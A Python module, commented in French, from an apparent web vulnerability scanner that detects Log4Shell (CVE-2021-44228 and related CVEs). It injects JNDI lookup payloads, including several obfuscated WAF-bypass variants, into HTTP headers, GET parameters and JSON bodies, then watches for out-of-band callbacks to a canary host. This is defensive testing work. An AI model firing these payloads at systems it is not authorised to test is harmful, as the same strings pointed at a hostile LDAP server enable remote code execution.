"""
PhantomScan — Log4Shell / Log4j Scanner (v5.5)
===============================================
Détection CVE-2021-44228 (Log4Shell) et variantes :
  CVE-2021-44228  — Log4j 2.x JNDI injection (RCE)
  CVE-2021-45046  — Bypass du patch initial (2.15.0)
  CVE-2021-45105  — DoS (infinite recursion)
  CVE-2021-44832  — RCE via configuration attaquante

Stratégie :
  ┌─────────────────────────────────────────────────────────┐
  │  Canary-based detection (SANS exploitation)             │
  │                                                         │
  │  Les payloads JNDI injectent une URL de callback        │
  │  (Burp Collaborator, OAST public, ou canary perso).     │
  │  Si le serveur résout le DNS / fait une requête HTTP,   │
  │  la vulnérabilité est confirmée.                        │
  │                                                         │
  │  Aucune payload n'exécute de code côté serveur.         │
  └─────────────────────────────────────────────────────────┘

Headers injectés (tous) :
  User-Agent, X-Forwarded-For, X-Forwarded-Host, X-Api-Version,
  Referer, Accept, Accept-Language, Origin, X-Real-IP,
  X-Custom-IP-Authorization, Authorization, Content-Type,
  X-Request-Id, X-Correlation-Id, X-Client-Id, X-Session-Id,
  CF-Connecting-IP, True-Client-IP, X-Originating-IP, X-WAP-Profile,
  Contact, Cookie

Variantes JNDI :
  - ${jndi:ldap://...}
  - ${jndi:ldaps://...}
  - ${jndi:rmi://...}
  - ${jndi:dns://...}
  - ${jndi:iiop://...}
  - Obfuscation : ${${lower:j}ndi:...}, ${${::-j}${::-n}di:...},
    ${${upper:j}ndi:...}, ${${env:NaN:-j}ndi:...}

Configuration :
  Fournir cfg.log4shell_canary = "XXXXX.burpcollaborator.net" (ou équivalent)
  Si non configuré → utilise un placeholder pour signaler les payloads testés.
"""

from __future__ import annotations

import asyncio
import hashlib
import time
from typing import AsyncIterator

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity


# ── Payloads JNDI ─────────────────────────────────────────────────────────────

def _build_payloads(canary_host: str) -> list[tuple[str, str]]:
    """
    Génère les variants JNDI avec le canary host.
    Retourne [(variant_name, payload_string), ...]
    """
    base_ldap  = f"ldap://{canary_host}/a"
    base_ldaps = f"ldaps://{canary_host}/a"
    base_dns   = f"dns://{canary_host}/a"
    base_rmi   = f"rmi://{canary_host}/a"

    payloads = [
        # Payloads directs
        ("jndi_ldap",           f"${{jndi:{base_ldap}}}"),
        ("jndi_ldaps",          f"${{jndi:{base_ldaps}}}"),
        ("jndi_rmi",            f"${{jndi:{base_rmi}}}"),
        ("jndi_dns",            f"${{jndi:{base_dns}}}"),

        # Obfuscations case / lower / upper
        ("jndi_lower",          f"${{${{lower:j}}ndi:{base_ldap}}}"),
        ("jndi_upper",          f"${{${{upper:j}}ndi:{base_ldap}}}"),
        ("jndi_mixed_case",     f"${{JnDi:{base_ldap}}}"),

        # Colon separator bypass (CVE-2021-45046)
        ("jndi_colonsep",
         "${${::-j}${::-n}${::-d}${::-i}:" + base_ldap + "}"),

        # env lookup bypass
        ("jndi_env_nan",
         "${${env:NaN:-j}ndi:" + base_ldap + "}"),

        # Nested lookup bypass
        ("jndi_nested",
         "${${lower:${lower:j}}ndi:" + base_ldap + "}"),

        # Double dollar bypass (certains WAF)
        ("jndi_double_dollar",  f"$${{jndi:{base_ldap}}}"),

        # Unicode obfuscation
        ("jndi_unicode",        f"${{j\u006edi:{base_ldap}}}"),

        # date/time lookup chaining (bypass length checks)
        ("jndi_date_bypass",
         "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:" + base_ldap + "}"),
    ]

    return payloads


# ── Headers à injecter ────────────────────────────────────────────────────────

INJECT_HEADERS: list[str] = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Api-Version",
    "Referer",
    "Accept",
    "Accept-Language",
    "Origin",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
    "Authorization",
    "X-Request-Id",
    "X-Correlation-Id",
    "X-Client-Id",
    "X-Session-Id",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Originating-IP",
    "X-WAP-Profile",
    "Contact",
    "Forwarded",
    "X-Cluster-Client-IP",
    "X-ProxyUser-Ip",
]


# ── Scanner ───────────────────────────────────────────────────────────────────

from phantomscan.core.scanner_mixin import ScannerMixin


class Log4ShellScanner(ScannerMixin):

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg
        # Canary configurable (mode legacy v5.18). Si absent et OOB v5.19 dispo,
        # on utilisera le canary manager en priorité.
        self._canary: str | None = getattr(cfg, "log4shell_canary", None)

    async def run(self, target: str) -> AsyncIterator[Finding]:
        # v5.19 — Privilégier le canary manager OOB s'il est dispo
        canary_obj = None
        canary_host = self._canary

        if self.oob is not None and self.oob.enabled:
            canary_obj = self.get_canary(tag="log4shell")
            if canary_obj is not None:
                canary_host = canary_obj.dns_name

        if not canary_host:
            # Pas de canary → émettre un avertissement et sortir
            yield Finding(
                title="Log4Shell — Scan incomplet (canary non configuré)",
                severity=Severity.INFO,
                url=target,
                module="Log4ShellScanner",
                description=(
                    "La détection Log4Shell nécessite un canary OOB. "
                    "Options v5.19 :\n"
                    "  --oob interactsh                    (auto, recommandé)\n"
                    "  --log4shell-canary XXXX.oastify.com (legacy)\n"
                    "Sans canary, ce module ne peut pas confirmer la vuln."
                ),
                evidence="No OOB backend, no log4shell_canary",
                remediation=(
                    "1. Lancer le scan avec --oob interactsh.\n"
                    "2. (alt) Déployer un serveur interactsh self-hosted.\n"
                    "3. (alt) Utiliser Burp Collaborator + --log4shell-canary."
                ),
                cwe="CWE-917",
            )
            return

        payloads = _build_payloads(canary_host)

        # Injection dans les headers — batch par groupe de 5 headers simultanément
        for i in range(0, len(INJECT_HEADERS), 5):
            header_batch = INJECT_HEADERS[i:i+5]
            tasks = [
                self._inject_header_batch(target, header_batch, payloads)
                for _ in [None]
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, Finding):
                    yield result

        # Injection dans les paramètres GET
        async for f in self._inject_params(target, payloads):
            yield f

        # Injection dans le body POST JSON (si l'endpoint accepte du JSON)
        async for f in self._inject_post_json(target, payloads):
            yield f

        # v5.19 — Si on utilise le canary manager, on POLL réellement les hits
        if canary_obj is not None:
            hits = await self.wait_for_oob_hit(canary_obj, timeout=20.0)
            if hits:
                proto = hits[0].get("protocol", "?")
                remote = hits[0].get("remote_address", "?")
                yield Finding(
                    title="Log4Shell CVE-2021-44228 CONFIRMED — JNDI lookup callback",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="Log4ShellScanner",
                    description=(
                        f"Log4Shell CONFIRMÉ : un callback {proto.upper()} a été "
                        f"reçu sur le canary OOB après injection des payloads JNDI "
                        f"(${{jndi:ldap://...}}). Origine : {remote}.\n"
                        f"Le serveur exécute Log4j en version vulnérable et "
                        f"interprète les lookups JNDI dans les inputs utilisateur. "
                        f"RCE possible si l'attaquant héberge un serveur LDAP "
                        f"malveillant pointant vers une classe Java."
                    ),
                    evidence=f"Canary callback | proto={proto} | remote={remote}",
                    remediation=(
                        "URGENT : mettre à jour Log4j >= 2.17.1 (Java 8) "
                        "ou >= 2.12.4 (Java 7). Mitigation immédiate : "
                        "log4j2.formatMsgNoLookups=true OU "
                        "supprimer JndiLookup.class du classpath."
                    ),
                    cwe="CWE-917",
                    cvss=10.0,
                )
                return

        # Résumé informatif (mode legacy ou hits non reçus dans le délai)
        yield Finding(
            title="Log4Shell — Payloads JNDI envoyés (vérifier le canary)",
            severity=Severity.INFO,
            url=target,
            module="Log4ShellScanner",
            description=(
                f"{len(payloads)} variants JNDI injectés dans "
                f"{len(INJECT_HEADERS)} headers HTTP + paramètres GET + POST JSON. "
                f"Vérifiez les interactions reçues sur : {canary_host}"
            ),
            evidence=(
                f"Canary: {canary_host}\n"
                f"Variants testés: {', '.join(n for n, _ in payloads[:6])}..."
            ),
            remediation=(
                "Si des callbacks sont reçus sur le canary → CVE-2021-44228 confirmé.\n"
                "Mise à jour immédiate vers Log4j >= 2.17.1 (Java 8) ou >= 2.12.4 (Java 7).\n"
                "Mitigation urgente : définir log4j2.formatMsgNoLookups=true "
                "ou supprimer JndiLookup.class du classpath."
            ),
            cwe="CWE-917",
            cvss=10.0,
        )

    # ── Injection headers ────────────────────────────────────────────────────

    async def _inject_header_batch(
        self,
        target: str,
        headers_to_test: list[str],
        payloads: list[tuple[str, str]],
    ) -> Finding | None:
        """Injecte les payloads dans un batch de headers."""
        for payload_name, payload in payloads[:4]:  # 4 variants par batch
            injected_headers = {h: payload for h in headers_to_test}
            try:
                resp = await self._req.get(
                    ProbeRequest(url=target, headers=injected_headers)
                )
                # Réponse 500 / erreur Java → signe de parsing Log4j
                body = (resp.text or "")[:2000]
                if _has_java_error(body):
                    return Finding(
                        title="Log4Shell — Erreur Java dans la réponse (CVE-2021-44228)",
                        severity=Severity.CRITICAL,
                        url=target,
                        module="Log4ShellScanner",
                        description=(
                            f"Stack trace Java détectée dans la réponse après injection "
                            f"du payload '{payload_name}' dans les headers : "
                            f"{headers_to_test}. "
                            f"Possible évaluation JNDI/Log4j."
                        ),
                        evidence=body[:500],
                        remediation=(
                            "Mettre à jour Log4j vers >= 2.17.1 immédiatement. "
                            "Vérifier les callbacks reçus sur le canary OOB."
                        ),
                        cwe="CWE-917",
                        cvss=10.0,
                    )
            except Exception:
                pass
            await asyncio.sleep(0.1)
        return None

    # ── Injection paramètres GET ─────────────────────────────────────────────

    async def _inject_params(
        self, target: str, payloads: list[tuple[str, str]]
    ) -> AsyncIterator[Finding]:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            return

        for param_name in list(params.keys())[:5]:
            for payload_name, payload in payloads[:3]:
                test_params = dict(params)
                test_params[param_name] = [payload]
                url = urlunparse(parsed._replace(
                    query=urlencode({k: v[0] for k, v in test_params.items()})
                ))
                try:
                    resp = await self._req.get(ProbeRequest(url=url))
                    body = (resp.text or "")[:2000]
                    if _has_java_error(body):
                        yield Finding(
                            title="Log4Shell — Erreur Java via paramètre GET (CVE-2021-44228)",
                            severity=Severity.CRITICAL,
                            url=url,
                            module="Log4ShellScanner",
                            description=(
                                f"Stack trace Java dans la réponse après injection "
                                f"payload '{payload_name}' dans le paramètre '{param_name}'."
                            ),
                            evidence=body[:500],
                            remediation="Mettre à jour Log4j vers >= 2.17.1.",
                            cwe="CWE-917",
                            cvss=10.0,
                        )
                        return
                except Exception:
                    pass
                await asyncio.sleep(0.1)

    # ── Injection POST JSON ──────────────────────────────────────────────────

    async def _inject_post_json(
        self, target: str, payloads: list[tuple[str, str]]
    ) -> AsyncIterator[Finding]:
        import json
        json_fields = ["username", "password", "email", "message", "query", "search", "input"]

        for payload_name, payload in payloads[:2]:
            body_data = {field: payload for field in json_fields}
            try:
                resp = await self._req.post(
                    ProbeRequest(
                        url=target,
                        headers={"Content-Type": "application/json"},
                        data=json.dumps(body_data),
                    )
                )
                body = (resp.text or "")[:2000]
                if _has_java_error(body):
                    yield Finding(
                        title="Log4Shell — Erreur Java via POST JSON (CVE-2021-44228)",
                        severity=Severity.CRITICAL,
                        url=target,
                        module="Log4ShellScanner",
                        description=(
                            f"Stack trace Java dans la réponse après injection "
                            f"payload '{payload_name}' dans le body JSON."
                        ),
                        evidence=body[:500],
                        remediation="Mettre à jour Log4j vers >= 2.17.1.",
                        cwe="CWE-917",
                        cvss=10.0,
                    )
                    return
            except Exception:
                pass
            await asyncio.sleep(0.2)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _has_java_error(body: str) -> bool:
    """Détecte un stacktrace Java ou une erreur JNDI dans le body."""
    import re
    patterns = [
        r"java\.lang\.\w+Exception",
        r"at com\.sun\.jndi",
        r"at org\.apache\.logging\.log4j",
        r"javax\.naming\.",
        r"com\.sun\.jndi\.ldap",
        r"JNDI lookup failed",
        r"Error looking up JNDI",
    ]
    for p in patterns:
        if re.search(p, body, re.I):
            return True
    return False
